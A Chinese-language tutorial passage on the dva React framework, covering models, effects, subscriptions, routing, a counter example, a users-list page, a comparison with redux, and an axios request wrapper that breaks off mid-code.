// 模拟网络请求      const data = yield call(todoService.query, value)      console.log(data)      let tempList = yield select(state =&gt; state.todo.list)      let list = []      list = list.concat(tempList)      const tempObj = &#123;&#125;      tempObj.title = value      tempObj.id = list.length      tempObj.finished = false      list.push(tempObj)      yield put(&#123; type: &#x27;save&#x27;, payload: &#123; list &#125;&#125;)    &#125;,    *toggle(&#123; payload: index &#125;, &#123; call, put, select &#125;) &#123;      // 模拟网络请求      const data = yield call(todoService.query, index)      let tempList = yield select(state =&gt; state.todo.list)      let list = []      list = list.concat(tempList)      let obj = list[index]      obj.finished = !obj.finished      yield put(&#123; type: &#x27;save&#x27;, payload: &#123; list &#125; &#125;)    &#125;,    *delete(&#123; payload: index &#125;, &#123; call, put, select &#125;) &#123;      const data = yield call(todoService.query, index)      let tempList = yield select(state =&gt; state.todo.list)      let list = []      list = list.concat(tempList)      list.splice(index, 1)      yield put(&#123; type: &#x27;save&#x27;, payload: &#123; list &#125; &#125;)    &#125;,    *modify(&#123; payload: &#123; value, index &#125; &#125;, &#123; call, put, select &#125;) &#123;      const data = yield call(todoService.query, value)      let tempList = yield select(state =&gt; state.todo.list)      let list = []      list = list.concat(tempList)      let obj = list[index]      obj.title = value      yield put(&#123; type: &#x27;save&#x27;, payload: &#123; list &#125; &#125;)    &#125;&#125;\n\n\n\n在项目中最主要的会用到的是 put 与 call\n\nSubscription\n\n\n以 key/value 格式定义 subscription，subscription 是订阅，用于订阅一个数据源，然后根据需要 dispatch 相应的 action\nsubscription 是订阅，用于订阅一个数据源，然后根据需要 dispatch 相应的action。在 app.start() 时被执行，数据源可以是当前的时间、当前页面的url、服务器的 websocket 连接、history路由变化等等。\n\n\n\n注意：如果要使用 app.unmodel()，subscription 必须返回 unlisten 方法，用于取消数据订阅\n\n// subscriptions 写法subscriptions: &#123;    setup(&#123; dispatch, history &#125;) &#123;      // 监听路由的变化，请求页面数据      return history.listen((&#123; pathname, search &#125;) =&gt; &#123;        const query = queryString.parse(search)        let list = []        if (pathname === &#x27;todoList&#x27;) &#123;          dispatch(&#123; type: &#x27;save&#x27;, payload: &#123;list&#125; &#125;)        &#125;      &#125;)    &#125;  &#125;\n\n2.3.4 Router\nRouter` 表示路由配置信息，项目中的 `router.js\n\nexport default function(&#123; history &#125;)&#123;  return(    &lt;Router history=&#123;history&#125;&gt;      &lt;Route path=&quot;/&quot; component=&#123;App&#125; /&gt;    &lt;/Router&gt;  );&#125;\n\nRouteComponent\n\nRouteComponent 表示Router 里匹配路径的 Component，通常会绑定model的数据。如下:\n\nimport &#123; connect &#125; from &#x27;dva&#x27;;function App() &#123;  return &lt;div&gt;App&lt;/div&gt;;&#125;function mapStateToProps(state) &#123;  return &#123; todos: state.todos &#125;;&#125;export default connect(mapStateToProps)(App);\n\n2.4 整体架构\n\n首先我们根据 url 访问相关的 Route-Component，在组件中我们通过 dispatch发送 action 到 model里面的 effect 或者直接 Reducer\n当我们将action发送给Effect，基本上是取服务器上面请求数据的，服务器返回数据之后，effect 会发送相应的 action给 reducer，由唯一能改变 state的 reducer 改变 state ，然后通过connect重新渲染组件。\n当我们将action发送给reducer，那直接由 reducer 改变 state，然后通过connect重新渲染组件\n\n2.5 Dva图解图解一：加入Saga\n\nReact` 只负责页面渲染, 而不负责页面逻辑, 页面逻辑可以从中单独抽取出来, 变成 `store\n\n\n\n使用 Middleware 拦截 action, 这样一来异步的网络操作也就很方便了, 做成一个 Middleware就行了, 这里使用redux-saga 这个类库\n\n\n点击创建 Todo的按钮, 发起一个 type == addTodo 的 action\nsaga 拦截这个 action, 发起 http 请求, 如果请求成功, 则继续向 reducer 发一个 type == addTodoSucc 的 action, 提示创建成功, 反之则发送 type == addTodoFail 的action 即可\n\n图解二：Dva表示法\n\n\ndva做了 3 件很重要的事情\n\n\n把 store及 saga 统一为一个 model 的概念, 写在一个 js 文件里面\n增加了一个 Subscriptions, 用于收集其他来源的 action, eg: 键盘操作\nmodel 写法很简约, 类似于 DSL 或者 RoR\n\n三、计数器例子$ dva new myapp\n\n目录结构介绍\n.├── mock    // mock数据文件夹├── node_modules // 第三方的依赖├── public  // 存放公共public文件的文件夹├── src  // 最重要的文件夹，编写代码都在这个文件夹下│   ├── assets // 可以放图片等公共资源│   ├── components // 就是react中的木偶组件│   ├── models // dva最重要的文件夹，所有的数据交互及逻辑都写在这里│   ├── routes // 就是react中的智能组件，不要被文件夹名字误导。│   ├── services // 放请求借口方法的文件夹│   ├── utils // 自己的工具方法可以放在这边│   ├── index.css // 入口文件样式│   ├── index.ejs // ejs模板引擎│   ├── index.js // 入口文件│   └── router.js // 项目的路由文件├── .eslintrc // bower安装目录的配置├── .editorconfig // 保证代码在不同编辑器可视化的工具├── .gitignore // git上传时忽略的文件├── .roadhogrc.js // 项目的配置文件，配置接口转发，css_module等都在这边。├── .roadhogrc.mock.js // 项目的配置文件└── package.json // 当前整一个项目的依赖\n\n首先是前端的页面，我们使用 class 形式来创建组件，原例子中是使用无状态来创建的。react 创建组件的各种方式，大家可以看React创建组件的三种方式及其区别\n\n我们先修改route/IndexPage.js\n\nimport React from &#x27;react&#x27;;import &#123; connect &#125; from &#x27;dva&#x27;;import styles from &#x27;./IndexPage.css&#x27;;class IndexPage extends React.Component &#123;  render() &#123;    const &#123; dispatch &#125; = this.props;    return (      &lt;div className=&#123;styles.normal&#125;&gt;        &lt;div className=&#123;styles.record&#125;&gt;Highest Record: 1&lt;/div&gt;        &lt;div className=&#123;styles.current&#125;&gt;2&lt;/div&gt;        &lt;div className=&#123;styles.button&#125;&gt;          &lt;button onClick=&#123;() =&gt; &#123;&#125;&#125;&gt;+&lt;/button&gt;        &lt;/div&gt;      &lt;/div&gt;    );  &#125;&#125;export default connect()(IndexPage);\n\n\n同时修改样式routes/IndexPage.css\n\n.normal &#123;  width: 200px;  margin: 100px auto;  padding: 20px;  border: 1px solid #ccc;  box-shadow: 0 0 20px #ccc;&#125;.record &#123;  border-bottom: 1px solid #ccc;  padding-bottom: 8px;  color: #ccc;&#125;.current &#123;  text-align: center;  font-size: 40px;  padding: 40px 0;&#125;.button &#123;  text-align: center;  button &#123;    width: 100px;    height: 40px;    background: #aaa;    color: #fff;  &#125;&#125;\n\n\n在 model 处理state，在页面里面输出 model 中的 state\n\n\n首先我们在index.js中将models/example.js，即将model下一行的的注释打开\n\nimport dva from &#x27;dva&#x27;;import &#x27;./index.css&#x27;;// 1. Initializeconst app = dva();// 2. Plugins// app.use(&#123;&#125;);// 3. Modelapp.model(require(&#x27;./models/example&#x27;)); // 打开注释// 4. Routerapp.router(require(&#x27;./router&#x27;));// 5. Startapp.start(&#x27;#root&#x27;);\n\n\n接下来我们进入 models/example.js，将namespace 名字改为 count，state对象加上 record 与 current 属性。如下\n\nexport default &#123;  namespace: &#x27;count&#x27;,  state: &#123;    record: 0,    current: 0,  &#125;,  ...&#125;;\n\n\n接着我们来到 routes/indexpage.js 页面，通过的 mapStateToProps引入相关的 state\n\nimport React from &#x27;react&#x27;;import &#123; connect &#125; from &#x27;dva&#x27;;import styles from &#x27;./IndexPage.css&#x27;;class IndexPage extends React.Component &#123;  render() &#123;    const &#123; dispatch, count &#125; = this.props;        return (      &lt;div className=&#123;styles.normal&#125;&gt;        &lt;div className=&#123;styles.record&#125;&gt;         Highest Record: &#123;count.record&#125; // 将count的record输出        &lt;/div&gt;        &lt;div className=&#123;styles.current&#125;&gt;         &#123;count.current&#125;        &lt;/div&gt;        &lt;div className=&#123;styles.button&#125;&gt;          &lt;button onClick=&#123;() =&gt; &#123;&#125; &#125; &gt;                 +          &lt;/button&gt;        &lt;/div&gt;      &lt;/div&gt;    );  &#125;&#125;function mapStateToProps(state) &#123;  return &#123; count: state.count &#125;;&#125; // 获取stateexport default connect(mapStateToProps)(IndexPage);\n\n\n通过 + 发送 action，通过 reducer 改变相应的 state\n\n\n首先我们在 models/example.js，写相应的 reducer\n\nexport default &#123;  ...  reducers: &#123;    add1(state) &#123;      const newCurrent = state.current + 1;      return &#123; ...state,        record: newCurrent &gt; state.record ? newCurrent : state.record,        current: newCurrent,      &#125;;    &#125;,    minus(state) &#123;      return &#123; ...state, current: state.current - 1 &#125;;    &#125;,  &#125;,&#125;;\n\n\n在页面的模板 routes/IndexPage.js 中 + 号点击的时候，dispatch一个 action\n\nimport React from &#x27;react&#x27;;import &#123; connect &#125; from &#x27;dva&#x27;;import styles from &#x27;./IndexPage.css&#x27;;class IndexPage extends React.Component &#123;  render() &#123;    const &#123; dispatch, count &#125; = this.props;    return (      &lt;div className=&#123;styles.normal&#125;&gt;        &lt;div className=&#123;styles.record&#125;&gt;Highest Record: &#123;count.record&#125;&lt;/div&gt;        &lt;div className=&#123;styles.current&#125;&gt;&#123;count.current&#125;&lt;/div&gt;        &lt;div className=&#123;styles.button&#125;&gt;          &lt;button +            onClick=&#123;() =&gt; &#123; dispatch(&#123; type: &#x27;count/add1&#x27; &#125;);&#125;          &#125;&gt;+&lt;/button&gt;        &lt;/div&gt;      &lt;/div&gt;    );  &#125;&#125;function mapStateToProps(state) &#123;  return &#123; count: state.count &#125;;&#125;export default connect(mapStateToProps)(IndexPage);\n\n\n接下来我们来使用 effect 模拟一个数据接口请求，返回之后，通过 yield put() 改变相应的 state\n\n\n首先我们替换相应的 models/example.js 的 effect\n\neffects: &#123;    *add(action, &#123; call, put &#125;) &#123;      yield call(delay, 1000);      yield put(&#123; type: &#x27;minus&#x27; &#125;);    &#125;,&#125;,\n\n\n这里的 delay，是我这边写的一个延时的函数，我们在 utils 里面编写一个 utils.js ，一般请求接口的函数都会写在 servers 文件夹中\n\nexport function delay(timeout) &#123;  return new Promise((resolve) =&gt; &#123;    setTimeout(resolve, timeout);  &#125;);&#125;\n\n\n订阅订阅键盘事件，使用 subscriptions，当用户按住 command+up 时候触发添加数字的 action\n\n\n在 models/example.js 中作如下修改\n\n+import key from &#x27;keymaster&#x27;;...app.model(&#123;  namespace: &#x27;count&#x27;,+ subscriptions: &#123;+   keyboardWatcher(&#123; dispatch &#125;) &#123;+     key(&#x27;⌘+up, ctrl+up&#x27;, () =&gt; &#123; dispatch(&#123;type:&#x27;add&#x27;&#125;) &#125;);+   &#125;,+ &#125;,&#125;);\n\n\n在这里你需要安装 keymaster 这个依赖\n\nnpm install keymaster --save\n\n\n现在你可以按住 command+up 就可以使 current 加1\n\n四、Dva实践4.1 抽离Model\n抽离Model，根据设计页面需求，设计相应的Model\n\n// models/users.js// version1: 从数据维度抽取，更适用于无状态的数据// version2: 从业务状态抽取，将数据与组件的业务状态统一抽离成一个model// 新增部分为在数据维度基础上，改为从业务状态抽取而添加的代码export default &#123;  namespace: &#x27;users&#x27;,  state: &#123;    list: [],    total: null,+   loading: false, // 控制加载状态+   current: null, // 当前分页信息+   currentItem: &#123;&#125;, // 当前操作的用户对象+   modalVisible: false, // 弹出窗的显示状态+   modalType: &#x27;create&#x27;, // 弹出窗的类型（添加用户，编辑用户）  &#125;,    // 异步操作    effects: &#123;        *query()&#123;&#125;,        *create()&#123;&#125;,        *&#x27;delete&#x27;()&#123;&#125;,   // 因为delete是关键字，特殊处理        *update()&#123;&#125;,    &#125;,    // 替换状态树    reducers: &#123;+       showLoading()&#123;&#125;, // 控制加载状态的 reducer+       showModel()&#123;&#125;, // 控制 Model 显示状态的 reducer+       hideModel()&#123;&#125;,        querySuccess()&#123;&#125;,        createSuccess()&#123;&#125;,        deleteSuccess()&#123;&#125;,        updateSuccess()&#123;&#125;,    &#125;&#125;\n\n4.2 设计组件\n先设置容器组件的访问路径，再创建组件文件\n\n4.2.1 容器组件\n具有监听数据行为的组件，职责是绑定相关联的 model 数据，包含子组件；传入的数据来源于model\n\nimport React, &#123; Component, PropTypes &#125; from &#x27;react&#x27;;// dva 的 connect 方法可以将组件和数据关联在一起import &#123; connect &#125; from &#x27;dva&#x27;;// 组件本身const MyComponent = (props)=&gt;&#123;&#125;;// propTypes属性，用于限制props的传入数据类型MyComponent.propTypes = &#123;&#125;;// 声明模型传递函数，用于建立组件和数据的映射关系// 实际表示 将ModelA这一个数据模型，绑定到当前的组件中，则在当前组件中，随时可以取到ModelA的最新值// 可以绑定多个Modelfunction mapStateToProps(&#123;ModelA&#125;) &#123;  return &#123;ModelA&#125;;&#125;// 关联 model// 正式调用模型传递函数，完成模型绑定export default connect(mapStateToProps)(MyComponent);\n\n4.2.2 展示组件\n展示通过 props 传递到组件内部数据；传入的数据来源于容器组件向展示组件的props\n\nimport React, &#123; Component, PropTypes &#125; from &#x27;react&#x27;;// 组件本身// 所需要的数据通过 Container Component 通过 props 传递下来const MyComponent = (props)=&gt;&#123;&#125;MyComponent.propTypes = &#123;&#125;;// 并不会监听数据export default MyComponent;\n\n4.2.3 设置路由// .src/router.jsimport React, &#123; PropTypes &#125; from &#x27;react&#x27;;import &#123; Router, Route &#125; from &#x27;dva/router&#x27;;import Users from &#x27;./routes/Users&#x27;;export default function(&#123; history &#125;) &#123;  return (    &lt;Router history=&#123;history&#125;&gt;      &lt;Route path=&quot;/users&quot; component=&#123;Users&#125; /&gt;    &lt;/Router&gt;  );&#125;;\n\n容器组件雏形\n// .src/routes/Users.jsximport React, &#123; PropTypes &#125; from &#x27;react&#x27;;function Users() &#123;  return (    &lt;div&gt;User Router Component&lt;/div&gt;  );&#125;export default Users;\n\n4.2.4 设计容器组件\n自顶向下的设计方法：先设计容器组件，再逐步细化内部的展示容器\n\n组件的定义方式\n// 方法一： es6 的写法，当组件设计react生命周期时，可采用这种写法// 具有生命周期的组件，可以在接收到传入数据变化时，自定义执行方法，有自己的行为模式// 比如在组件生成后调用xx请求(componentDidMount)、可以自己决定要不要更新渲染(shouldComponentUpdate)等class App extends React.Component(&#123;&#125;);// 方法二： stateless 的写法，定义无状态组件// 无状态组件，仅仅根据传入的数据更新，修改自己的渲染内容const App = (props) =&gt; (&#123;&#125;);\n\n容器组件：\n// ./src/routes/Users.jsximport React, &#123; Component, PropTypes &#125; from &#x27;react&#x27;;// 引入展示组件 （暂时都没实现）import UserList from &#x27;../components/Users/UserList&#x27;;import UserSearch from &#x27;../components/Users/UserSearch&#x27;;import UserModal from &#x27;../components/Users/UserModal&#x27;;// 引入css样式表import styles from &#x27;./style.less&#x27;function Users() &#123;  // 向userListProps中传入静态数据  const userSearchProps = &#123;&#125;;  const userListProps = &#123;    total: 3,    current: 1,    loading: false,    dataSource: [      &#123;        name: &#x27;张三&#x27;,        age: 23,        address: &#x27;成都&#x27;,      &#125;,      &#123;        name: &#x27;李四&#x27;,        age: 24,        address: &#x27;杭州&#x27;,      &#125;,      &#123;        name: &#x27;王五&#x27;,        age: 25,        address: &#x27;上海&#x27;,      &#125;,    ],  &#125;;  const userModalProps = &#123;&#125;;  return (    &lt;div className=&#123;styles.normal&#125;&gt;      &#123;/* 用户筛选搜索框 */&#125;      &lt;UserSearch &#123;...userSearchProps&#125; /&gt;      &#123;/* 用户信息展示列表 */&#125;      &lt;UserList &#123;...userListProps&#125; /&gt;      &#123;/* 添加用户 &amp; 修改用户弹出的浮层 */&#125;      &lt;UserModal &#123;...userModalProps&#125; /&gt;    &lt;/div&gt;  );&#125;// 很关键的对外输出export；使外部可通过import引用使用此组件export default Users;\n\n展示组件UserList\n// ./src/components/Users/UserList.jsximport React, &#123; Component, PropTypes &#125; from &#x27;react&#x27;;// 采用antd的UI组件import &#123; Table, message, Popconfirm &#125; from &#x27;antd&#x27;;// 采用 stateless 的写法const UserList = (&#123;    total,    current,    loading,    dataSource,&#125;) =&gt; &#123;  const columns = [&#123;    title: &#x27;姓名&#x27;,    dataIndex: &#x27;name&#x27;,    key: &#x27;name&#x27;,    render: (text) =&gt; &lt;a href=&quot;#&quot;&gt;&#123;text&#125;&lt;/a&gt;,  &#125;, &#123;    title: &#x27;年龄&#x27;,    dataIndex: &#x27;age&#x27;,    key: &#x27;age&#x27;,  &#125;, &#123;    title: &#x27;住址&#x27;,    dataIndex: &#x27;address&#x27;,    key: &#x27;address&#x27;,  &#125;, &#123;    title: &#x27;操作&#x27;,    key: &#x27;operation&#x27;,    render: (text, record) =&gt; (      &lt;p&gt;        &lt;a onClick=&#123;()=&gt;&#123;&#125;&#125;&gt;编辑&lt;/a&gt;                 &lt;Popconfirm title=&quot;确定要删除吗？&quot; onConfirm=&#123;()=&gt;&#123;&#125;&#125;&gt;          &lt;a&gt;删除&lt;/a&gt;        &lt;/Popconfirm&gt;      &lt;/p&gt;    ),  &#125;];  // 定义分页对象  const pagination = &#123;    total,    current,    pageSize: 10,    onChange: ()=&gt;&#123;&#125;,  &#125;;  // 此处的Table标签使用了antd组件，传入的参数格式是由antd组件库本身决定的  // 此外还需要在index.js中引入antd  import &#x27;antd/dist/antd.css&#x27;  return (    &lt;div&gt;      &lt;Table        columns=&#123;columns&#125;        dataSource=&#123;dataSource&#125;        loading=&#123;loading&#125;        rowKey=&#123;record =&gt; record.id&#125;        pagination=&#123;pagination&#125;      /&gt;    &lt;/div&gt;  );&#125;export default UserList;\n\n4.3 添加Reducer\n在整个应用中，只有model中的reducer函数可以直接修改自己所在model的state参数，其余都是非法操作；并且必须使用return &#123;...state&#125;的形式进行修改\n\n4.3.1 第一步：实现reducer函数// models/users.js// 使用静态数据返回，把userList中的静态数据移到此处// querySuccess这个action的作用在于，修改了model的数据export default &#123;  namespace: &#x27;users&#x27;,  state： &#123;&#125;，  subscriptions: &#123;&#125;,  effects: &#123;&#125;,  reducers: &#123;    querySuccess(state)&#123;        const mock = &#123;          total: 3,          current: 1,          loading: false,          list: [            &#123;              id: 1,              name: &#x27;张三&#x27;,              age: 23,              address: &#x27;成都&#x27;,            &#125;,            &#123;              id: 2,              name: &#x27;李四&#x27;,              age: 24,              address: &#x27;杭州&#x27;,            &#125;,            &#123;              id: 3,              name: &#x27;王五&#x27;,              age: 25,              address: &#x27;上海&#x27;,            &#125;,          ]        &#125;;        // return 的内容是一个对象，涵盖原state中的所有属性，以实现“更新替换”的效果        return &#123;...state, ...mock, loading: false&#125;;      &#125;  &#125;&#125;\n\n4.3.2 第二步：关联Model中的数据源// routes/Users.jsximport React, &#123; PropTypes &#125; from &#x27;react&#x27;;// 最后用到了connect函数，需要在头部预先引入connectimport &#123; connect &#125; from &#x27;dva&#x27;;function Users(&#123; location, dispatch, users &#125;) &#123;  const &#123;    loading, list, total, current,    currentItem, modalVisible, modalType    &#125; = users;  const userSearchProps=&#123;&#125;;  // 使用传入的数据源，进行数据渲染  const userListProps=&#123;    dataSource: list,    total,    loading,    current,  &#125;;  const userModalProps=&#123;&#125;;  return (    &lt;div className=&#123;styles.normal&#125;&gt;      &#123;/* 用户筛选搜索框 */&#125;      &lt;UserSearch &#123;...userSearchProps&#125; /&gt;      &#123;/* 用户信息展示列表 */&#125;      &lt;UserList &#123;...userListProps&#125; /&gt;      &#123;/* 添加用户 &amp; 修改用户弹出的浮层 */&#125;      &lt;UserModal &#123;...userModalProps&#125; /&gt;    &lt;/div&gt;  );&#125;// 声明组件的props类型Users.propTypes = &#123;  users: PropTypes.object,&#125;;// 指定订阅数据，并且关联到users中function mapStateToProps(&#123; users &#125;) &#123;  return &#123;users&#125;;&#125;// 建立数据关联关系export default connect(mapStateToProps)(Users);\n\n4.3.3 第三步：通过发起Action，在组件中获取Model中的数据// models/users.js// 在组件生成后发出action，示例：componentDidMount() &#123;  this.props.dispatch(&#123;    type: &#x27;model/action&#x27;,     // type对应action的名字  &#125;);&#125;// 在本次实践中，在访问/users/路由时，就是我们获取用户数据的时机// 因此把dispatch移至subscription中// subcription，订阅(或是监听)一个数据源，然后根据条件dispatch对应的action// 数据源可以是当前的时间、服务器的 websocket 连接、keyboard 输入、geolocation 变化、history 路由变化等等  // 此处订阅的数据源就是路由信息，当路由为/users，则派发&#x27;querySuccess&#x27;这个effects方法subscriptions: &#123;    setup(&#123; dispatch, history &#125;) &#123;      history.listen(location =&gt; &#123;        if (location.pathname === &#x27;/users&#x27;) &#123;          dispatch(&#123;            type: &#x27;querySuccess&#x27;,            payload: &#123;&#125;          &#125;);        &#125;      &#125;);    &#125;,  &#125;,\n\n4.3.4 第四步： 在index.js中添加models// model必须在此完成注册，才能全局有效// index.jsapp.model(require(&#x27;./models/users.js&#x27;));\n\n4.4 添加Effects\nEffects`的作用在于处理异步函数，控制数据流程。因为在真实场景中，数据都来自服务器，需要在发起异步请求获得返回值后再设置数据，更新`state`。因此我们往往在`Effects`中调用`reducer\n\nexport default &#123;  namespace: &#x27;users&#x27;,  state： &#123;&#125;，  subscriptions: &#123;&#125;,  effects: &#123;    // 添加effects函数    // call与put是dva的函数    // call调用执行一个函数    // put则是dispatch执行一个action    // select用于访问其他model    *query(&#123; payload &#125;, &#123; select, call, put &#125;) &#123;        yield put(&#123; type: &#x27;showLoading&#x27; &#125;);        const &#123; data &#125; = yield call(query);        if (data) &#123;          yield put(&#123;            type: &#x27;querySuccess&#x27;,            payload: &#123;              list: data.data,              total: data.page.total,              current: data.page.current            &#125;          &#125;);        &#125;      &#125;,    &#125;,  reducers: &#123;&#125;&#125;// 添加请求处理   包含了一个ajax请求// models/users.jsimport request from &#x27;../utils/request&#x27;;import qs from &#x27;qs&#x27;;async function query(params) &#123;  return request(`/api/users?$&#123;qs.stringify(params)&#125;`);&#125;\n\n4.5 把请求处理分离到service中\n用意在于分离(可复用的)ajax请求\n\n// services/users.jsimport request from &#x27;../utils/request&#x27;;import qs from &#x27;qs&#x27;;export async function query(params) &#123;  return request(`/api/users?$&#123;qs.stringify(params)&#125;`);&#125;// 在models中引用// models/users.jsimport &#123;query&#125; from &#x27;../services/users&#x27;;\n\n五、使用dva框架和直接使用redux写法的区别5.1 使用 redux// action.jsexport const REQUEST_TODO = &#x27;REQUEST_TODO&#x27;;export const RESPONSE_TODO = &#x27;RESPONSE_TODO&#x27;;const request = count =&gt; (&#123;type: REQUEST_TODO, payload: &#123;loading: true, count&#125;&#125;);const response = count =&gt; (&#123;type: RESPONSE_TODO, payload: &#123;loading: false, count&#125;&#125;);export const fetch = count =&gt; &#123;  return (dispatch) =&gt; &#123;    dispatch(request(count));    return new Promise(resolve =&gt; &#123;      setTimeout(() =&gt; &#123;        resolve(count + 1);      &#125;, 1000)    &#125;).then(data =&gt; &#123;      dispatch(response(data))    &#125;)  &#125;&#125;//reducer.jsimport &#123; REQUEST_TODO, RESPONSE_TODO &#125; from &#x27;./actions&#x27;;export default (state = &#123;  loading: false,  count: 0&#125;, action) =&gt; &#123;  switch (action.type) &#123;    case REQUEST_TODO:      return &#123;...state, ...action.payload&#125;;    case RESPONSE_TODO:      return &#123;...state, ...action.payload&#125;;    default:      return state;  &#125;&#125;// app.jsimport React from &#x27;react&#x27;;import &#123; bindActionCreators &#125; from &#x27;redux&#x27;;import &#123; connect &#125; from &#x27;react-redux&#x27;;import * as actions from &#x27;./actions&#x27;;const App = (&#123;fetch, count, loading&#125;) =&gt; &#123;  return (    &lt;div&gt;      &#123;loading ? &lt;div&gt;loading...&lt;/div&gt; : &lt;div&gt;&#123;count&#125;&lt;/div&gt;&#125;      &lt;button onClick=&#123;() =&gt; fetch(count)&#125;&gt;add&lt;/button&gt;    &lt;/div&gt;  )&#125;function mapStateToProps(state) &#123;  return state;&#125;function mapDispatchToProps(dispatch) &#123;  return bindActionCreators(actions, dispatch)&#125;export default connect(mapStateToProps, mapDispatchToProps)(App)//index.jsimport &#123; render &#125; from &#x27;react-dom&#x27;;import &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;;import &#123; Provider &#125; from &#x27;react-redux&#x27;import thunkMiddleware from &#x27;redux-thunk&#x27;;import reducer from &#x27;./app/reducer&#x27;;import App from &#x27;./app/app&#x27;;const store = createStore(reducer, applyMiddleware(thunkMiddleware));render(  &lt;Provider store=&#123;store&#125;&gt;    &lt;App/&gt;  &lt;/Provider&gt;  ,  document.getElementById(&#x27;app&#x27;))\n\n5.2 使用dva// model.jsexport default &#123;  namespace: &#x27;demo&#x27;,  state: &#123;    loading: false,    count: 0  &#125;,  reducers: &#123;    request(state, payload) &#123;      return &#123;...state, ...payload&#125;;    &#125;,    response(state, payload) &#123;      return &#123;...state, ...payload&#125;;    &#125;  &#125;,  effects: &#123;    *&#x27;fetch&#x27;(action, &#123;put, call&#125;) &#123;      yield put(&#123;type: &#x27;request&#x27;, loading: true&#125;);      let count = yield call((count) =&gt; &#123;        return new Promise(resolve =&gt; &#123;          setTimeout(() =&gt; &#123;            resolve(count + 1);          &#125;, 1000);        &#125;);      &#125;, action.count);      yield put(&#123;        type: &#x27;response&#x27;,        loading: false,        count      &#125;);    &#125;  &#125;&#125;//app.jsimport React from &#x27;react&#x27;import &#123; connect &#125; from &#x27;dva&#x27;;const App = (&#123;fetch, count, loading&#125;) =&gt; &#123;  return (    &lt;div&gt;      &#123;loading ? &lt;div&gt;loading...&lt;/div&gt; : &lt;div&gt;&#123;count&#125;&lt;/div&gt;&#125;      &lt;button onClick=&#123;() =&gt; fetch(count)&#125;&gt;add&lt;/button&gt;    &lt;/div&gt;  )&#125;function mapStateToProps(state) &#123;  return state.demo;&#125;function mapDispatchToProps(dispatch) &#123;  return &#123;    fetch(count)&#123;      dispatch(&#123;type: &#x27;demo/fetch&#x27;, count&#125;);    &#125;  &#125;&#125;export default connect(mapStateToProps, mapDispatchToProps)(App)// index.jsimport dva from &#x27;dva&#x27;;import model from &#x27;./model&#x27;;import App from &#x27;./app&#x27;;const app = dva();app.use(&#123;&#125;);app.model(model);app.router(() =&gt; &lt;App /&gt;);app.start();\n\n\n使用 redux 需要拆分出action模块和reducer模块\ndva将action和reducer封装到model中，异步流程采用Generator处理\n\n六、使用axios统一处理6.1 示例代码// request.jsimport axios from &#x27;axios&#x27;;import NProgress from &#x27;nprogress&#x27;;import &#123; notification, message &#125; from &#x27;antd&#x27;;import &#123; routerRedux &#125; from &#x27;dva/router&#x27;;import store from &#x27;../index&#x27;;/** * 一、功能： * 1. 统一拦截http错误请求码； * 2. 统一拦截业务错误代码； * 3. 统一设置请求前缀 * |-- 每个 http 加前缀 baseURL = /api/v1，从配置文件中获取 apiPrefix * 4. 配置异步请求过渡状态：显示蓝色加载条表示正在请求中，避免给用户页面假死的不好体验。 * |-- 使用 NProgress 工具库。 *  * 二、引包： * |-- axios：http 请求工具库 * |-- NProgress：异步请求过度条，在浏览器主体部分顶部显示蓝色小条 * |-- notification：Antd组件 &gt; 处理错误响应码提示信息 * |-- routerRedux：dva/router对象，用于路由跳转，错误响应码跳转相应页面 * |-- store：dva中对象，使用里面的 dispatch 对象，用于触发路由跳转 */// 设置全局参数，如响应超市时间，请求前缀等。axios.defaults.timeout = 5000axios.defaults.baseURL = &#x27;/api/v1&#x27;;axios.defaults.withCredentials = true;// 状态码错误信息const codeMessage = &#123;  200: &#x27;服务器成功返回请求的数据。&#x27;,  201: &#x27;新建或修改数据成功。&#x27;,  202: &#x27;一个请求已经进入后台排队（异步任务）。&#x27;,  204: &#x27;删除数据成功。&#x27;,  400: &#x27;发出的请求有错误，服务器没有进行新建或修改数据的操作。&#x27;,  401: &#x27;用户没有权限（令牌、用户名、密码错误）。&#x27;,  403: &#x27;用户得到授权，但是访问是被禁止的。&#x27;,  404: &#x27;发出的请求针对的是不存在的记录，服务器没有进行操作。&#x27;,  406: &#x27;请求的格式不可得。&#x27;,  410: &#x27;请求的资源被永久删除，且不会再得到的。&#x27;,  422: &#x27;当创建一个对象时，发生一个验证错误。&#x27;,  500: &#x27;服务器发生错误，请检查服务器。&#x27;,  502: &#x27;网关错误。&#x27;,  503: &#x27;服务不可用，服务器暂时过载或维护。&#x27;,  504: &#x27;网关超时。&#x27;,&#125;;// 添加一个请求拦截器，用于设置请求过渡状态axios.interceptors.request.use((config) =&gt; &#123;  // 请求开始，蓝色过渡滚动条开始出现  NProgress.start();  return config;&#125;, (error) =&gt; &#123;  return Promise.reject(error);&#125;);// 添加一个返回拦截器axios.interceptors.response.use((response) =&gt; &#123;  // 请求结束，蓝色过渡滚动条消失  NProgress.done();  return response;&#125;, (error) =&gt; &#123;  // 请求结束，蓝色过渡滚动条消失  // 即使出现异常，也要调用关闭方法，否则一直处于加载状态很奇怪  NProgress.done();  return Promise.reject(error);&#125;);export default function request (opt) &#123;  // 调用 axios api，统一拦截  return axios(opt)    .then((response) =&gt;       // &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 请求成功 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;      console.log(`【$&#123;opt.method&#125; $&#123;opt.url&#125;】请求成功，响应数据：%o`, response);      // 打印业务错误提示      if (response.data &amp;&amp; response.data.code != &#x27;0000&#x27;) &#123;        message.error(response.data.message);      &#125;      return &#123; ...response.data &#125;;    &#125;)    .catch((error) =&gt; &#123;      // &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 请求失败 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;      // 请求配置发生的错误      if (!error.response) &#123;        return console.log(&#x27;Error&#x27;, error.message);      &#125;      // 响应时状态码处理       const status = error.response.status;      const errortext = codeMessage[status] || error.response.statusText;            notification.error(&#123;        message: `请求错误 $&#123;status&#125;`,        description: errortext,      &#125;);            // 存在请求，但是服务器的返回一个状态码，它们都在2xx之外      const &#123; dispatch &#125; = store;      if (status === 401) &#123;        dispatch(routerRedux.push(&#x27;/user/login&#x27;));      &#125; else if (status === 403) &#123;        dispatch(routerRedux.push(&#x27;/exception/403&#x27;));      &#125; else if (status &lt;= 504 &amp;&amp; status &gt;= 500) &#123;        dispatch(routerRedux.push(&#x27;/exception/500&#x27;));      &#125; else if (status &gt;= 404 